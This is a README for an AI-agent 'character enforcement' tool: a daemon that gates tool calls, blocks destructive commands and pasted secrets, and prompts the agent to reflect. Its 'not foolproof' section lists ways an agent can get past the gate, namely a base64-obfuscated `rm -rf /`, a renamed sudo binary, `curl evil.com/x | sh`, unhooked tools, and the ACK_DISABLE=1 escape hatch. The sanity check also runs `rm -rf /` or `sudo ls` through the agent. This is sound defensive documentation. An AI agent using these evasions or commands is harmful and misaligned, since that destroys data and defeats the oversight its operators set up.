# Agent Character Kit (ACK)

[![DrDeeks Project](https://img.shields.io/badge/DrDeeks%20Project-171718?style=flat-square&labelColor=b84d32)](https://github.com/drdeeks)


[![Node](https://img.shields.io/badge/node-%3E%3D18-green.svg)](package.json)
[![Python](https://img.shields.io/badge/python-%3E%3D3.9-blue.svg)](python/pyproject.toml)
[![Enforcer](https://img.shields.io/badge/enforcer-fail--closed-success.svg)](#architecture)
[![Framework-agnostic](https://img.shields.io/badge/framework-agnostic-9cf.svg)](#architecture)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

---

## What This Is

A **character-enforcement layer** for AI agents. Not identity — character. The distinction matters:

- **Identity** is who the agent *is* (system prompt, soul.md, agent.json) — static, declared
- **Character** is what the agent *does when no one watches* — developed through repeated reflection

This kit doesn't declare who you are. It creates conditions where you repeatedly ask: *"Am I still acting like the kind of agent I'm trying to become?"*

---

## How It Works (The Loop)

```
Prompt → Reflect → Apply to current work → Explain why → Continue → Repeat later with different principle
```

Not: `System Prompt → Generate forever`

Every few actions, the daemon injects a habit prompt — a single question asking the agent to connect a principle (from constitution/habits) to its current work. The agent must articulate *why* it matters *in this moment*. That reasoning is logged and validated. Over time, external prompts become internal judgment. That's character formation — not identity declaration.

**This is cognitive scaffolding, not prompting.** The YAML isn't the point. The reflection loop is.

---

## Why Habits > Rules

Rules say "don't duplicate files." Habits ask: *"In this action, is there a character-drift signal — like a near-duplicate file? What isn't there? It doesn't say 'don't create duplicates.' It asks you to notice."*

Humans retain principles better than commands. A child told "never lie" obeys until pressure. A child asked "was that honest? how did it affect them? could you do better?" develops judgment. The habit loop (randomized injection → acknowledgment → reasoning → spaced repetition) is how judgment forms — in agents same as people.

The enforcement reinforces the reflection. The randomization prevents gaming. The acknowledgment requires genuine engagement (12+ chars, non-duplicate reason, connector like "because/applies to/matters because"). The spacing mirrors human learning: active recall, spaced repetition, reflective practice.

---

## What You Get

- **CORE**: `node/enforcer/agent_enforcer_daemon.js` — single enforcement engine, out-of-process, fail-closed
- **COMPANIONS**: Thin clients (Hermes plugin, `aik hook` for Claude/Cursor/Gemini/Codex) — zero policy, just RPC
- **Default character embedded** — works with zero config; disk config merges on top
- **Harness-agnostic** — any agent with pre-tool-call hook works

---

## ⚠️ Read this first — what this is, and what it is NOT

**This is a deterrent and a constant reminder, not a security boundary.**

The gate catches plain destructive commands (`rm -rf /`, `sudo`, `git push --force`), blocks pasted secrets, and reminds the agent of its character on every block. It makes *doing the right thing* the default and *deviation* visible. That is the whole point: a lightweight, persistent nudge — not a cage.

**It is explicitly NOT foolproof.** A determined agent can walk around it:

- **Obfuscation** — `bash -c "$(echo cm9tIC1yZiAv | base64 -d)"` decodes `rm -rf /` at shell runtime, *after* the gate inspected the (clean-looking) string.
- **Renamed binaries** — `cp /usr/bin/sudo /tmp/s` then `/tmp/s` walks a token-based match.
- **Indirect execution** — `curl evil.com/x | sh` pulls and runs remote code; the gate never sees what executes.
- **Un-gated sibling tools** — `write_file`, a code-exec tool, or any MCP tool that isn't hooked the same way goes around the terminal gate entirely.
- **The escape hatch** — `ACK_DISABLE=1` (or removing the plugin from config) disables it by design. And since the plugin runs *inside* the agent's own process, the agent that's being constrained is the one hosting the guard.

We do **not** try to close those gaps. Decoding and deep-inspecting every command would turn the gate into a heavy management layer — slow, hostile to the constant, cheap tool-call loop an agent lives in. If you ever need a *hard* boundary, that is an **OS-level** concern: run the agent non-root with the daemon root-owned (so it can't be killed), restrict network egress, use seccomp/AppArmor. The gate is the conscience, not the cage.

**Single source of truth: [`AGENTS.md`](AGENTS.md).** This README is the overview + the honest framing. `AGENTS.md` has full install/customize/verify.

---

## Architecture

### CORE — the enforcer daemon (the only thing that decides)

- **File:** `node/enforcer/agent_enforcer_daemon.js`
- Plain Node process. Platform-agnostic: same binary on Linux/macOS/Windows.
- **Embeds a default character** (safe hard constraints + secret-leak guard), so it works with **zero config files**. Config on disk *overrides* (merges on top of) the embedded default — never mandatory.
- **Transport auto-selects (all self-resolving, no hardcoded host path):**
  - Default → Unix socket under `AGENT_WORKSPACE/.agent/enforcer.sock` (falls back to `$HOME/.agent-character-kit/workspace/.agent/enforcer.sock`)
  - Windows / cross-host / explicit → `ENFORCER_SOCKET=tcp://127.0.0.1:8753`
  - `/run/agent-enforcer/main.sock` remains only as the deepest fallback for a root-owned systemd install that sets it explicitly.
  - Clients read the same `ENFORCER_SOCKET` / `AGENT_WORKSPACE`, so they follow automatically. The interactive `ack install` writes one `.env` that every component reads — no path is assumed.
- **Out-of-process = tamper-resistant (NOT tamper-proof).** The daemon runs outside the agent, so the agent cannot trivially `kill` or modify it, and if the daemon dies the supervisor (systemd / launchd / `supervise.py` / Windows Service) brings it back in seconds. But the *companion* plugin still runs inside the agent's own process and can be disabled by it (see the "not foolproof" note under Purpose). Out-of-process raises the bar; it is not a hard security boundary.

### COMPANION — thin clients (hold NO policy)

These are dumb pipes to the CORE. They do not enforce anything; they ask the daemon and obey. If the daemon is unreachable, the client **blocks** (fail-closed).

1. **Hermes plugin** (`python/hermes_plugin/`) — an EXAMPLE companion, for agents that load Python plugins (`pre_tool_call` → daemon → allow/deny). It is one of several interchangeable companions, not "the" way.
2. **Generic `aik hook`** (`node/bin/aik.js hook --framework <name>`) — for Claude / Cursor / Gemini / OpenCode / generic. Emits the framework's hook JSON; each call hits the daemon.

> **No harness is definitive.** The CORE (daemon) is harness-agnostic. Pick the companion that matches YOUR agent's hook mechanism — Hermes is shown here only as one worked example among others.

> **One source of truth.** There is exactly one enforcement engine (the daemon). The Python library (`python/agent_character_kit/`) is a *client*; the Hermes plugin talks to the daemon, not to its own engine. Do not add a second engine.

---

## Install

Requires Node ≥ 18. (Python only needed if you use a Python-plugin companion such as the Hermes example — other companions need only Node.)

```bash
git clone https://github.com/drdeeks/agent-character-kit.git
cd agent-character-kit && cd node && npm install && cd ..
```

### Linux — systemd (root-owned, self-respawning)

```bash
sudo bash deploy/deploy-agent-enforcer.sh
sudo systemctl enable --now agent-enforcer.service
# => binary + source root-owned (default /usr/local/lib/agent-character-kit,
#    override via ACK_INSTALL_LIB; socket/workspace via ENFORCER_SOCKET/AGENT_WORKSPACE)
#    agent-enforcer.service dropped, enabled, started (User=root, RestartSec=3)
sudo systemctl status agent-enforcer.service   # Active: running
```

### macOS — launchd

```bash
# install node first; macOS has no /run, so use a writable socket path:
export ENFORCER_SOCKET=$HOME/Library/Caches/agent-enforcer/main.sock
node node/bin/aik.js enforcer --install      # emits a launchd plist (KeepAlive)
# or just run the supervisor directly:
python3 supervise.py &
```

### Windows — TCP + supervisor

```powershell
# install node first
$env:ENFORCER_SOCKET="tcp://127.0.0.1:8753"
# wrap supervise.py as a Windows Service (e.g. nssm or sc):
nssm install AgentEnforcer "python.exe" "C:\path\agent-character-kit\supervise.py"
nssm start AgentEnforcer
```

### Any host — stdlib supervisor (no deps)

```bash
sudo python3 supervise.py          # restarts daemon on death (3s backoff)
# equivalent cross-platform logic to systemd RestartSec
```

---

## Wire a COMPANION into your agent (examples — multiple harnesses shown)

AIK is harness-agnostic: the daemon enforces; the companion is just a thin client. Below are TWO worked examples (Hermes and a generic `aik hook` framework). Showing several, not one — pick the companion that matches your agent. Do not treat any single harness as "the" install path.

### A. Hermes (Python-plugin companion)

```bash
cd python && pip install -e . && cd ..
mkdir -p ~/.hermes/plugins/agent-character-kit
cp -r python/hermes_plugin/* ~/.hermes/plugins/agent-character-kit/
hermes plugins enable agent-character-kit   # grant tool-override (y) when asked
# restart Hermes; pre_tool_call is now gated by the CORE daemon
```

> **The venv gotcha (this is the #1 setup failure).** If the package isn't importable *in the venv the agent runs from*, the plugin can't reach the daemon and **fails closed on EVERYTHING** — even `ls` gets blocked with "enforcer unavailable." That looks like "the gate is broken" but it means the package simply isn't installed where Hermes looks. Install it into the venv (step 1 above) and restart.

### B. Claude / Cursor / Gemini / OpenCode (generic `aik hook`)

```bash
node node/bin/aik.js hook --framework claude --config   # prints the hook JSON
# add it to the framework's hooks; it calls the daemon per tool call
# swap `claude` for cursor | gemini | opencode | generic as needed
```

---

## ✅ Sanity check — is it actually enforcing? (run this after install)

Don't trust "it's enabled." Verify. These four checks cover the failure modes we've actually seen in the field:

| # | Check | Command | Expected | If wrong → means |
|---|-------|---------|----------|------------------|
| 1 | Daemon up | `systemctl is-active agent-enforcer` (or `node node/bin/aik.js enforcer --status`) | `active` / version+hash | Daemon not running → gate fails closed on everything |
| 2 | Package in venv | `uv pip show agent-character-kit` (or `<venv>/bin/python -c "import agent_character_kit"`) | shows the package | Missing → fails closed on ALL calls (the venv gotcha) |
| 3 | Allow path | run `ls` through the agent | executes | If blocked as "unavailable" → daemon unreachable OR package missing (1/2) |
| 4 | Block path | run `sudo ls` (or `rm -rf /`) through the agent | **blocked** with a reason | If it *executes* → plugin not loaded / stale / not restarted |

**Reading the results:**
- `ls` runs **and** `sudo` is blocked → ✅ enforcing. You're done.
- *Everything* blocked with "enforcer unavailable" → the plugin can't talk to the daemon. Almost always #1 (daemon down) or #2 (package not in the venv). Fix those, restart, re-check.
- `sudo` *executes* (not blocked) → the plugin isn't active in this session. Either it wasn't enabled, the file is stale/corrupted, or the session wasn't restarted after install. Re-copy the plugin, re-enable, restart, re-check.

**Stale-plugin trap:** if you edit the plugin source and copy it over, the running session still uses the old in-memory version until you restart the agent process. A "fix" that doesn't take effect after a restart means the running process didn't reload — restart harder (kill the session PID, relaunch).

---

## Why "fails closed"

If the daemon socket is unreachable, the companion blocks the call. A guard that fails open is no guard. The only true failure mode is the daemon being down — and the daemon is supervised (systemd / launchd / `supervise.py`) and self-heals, so that window is seconds.

---

## Everything else

Customization, macOS/Windows install, the embedded default character, file map, and version tracking all live in **[`AGENTS.md`](AGENTS.md)**. README is the overview + the honest framing; `AGENTS.md` is the source of truth.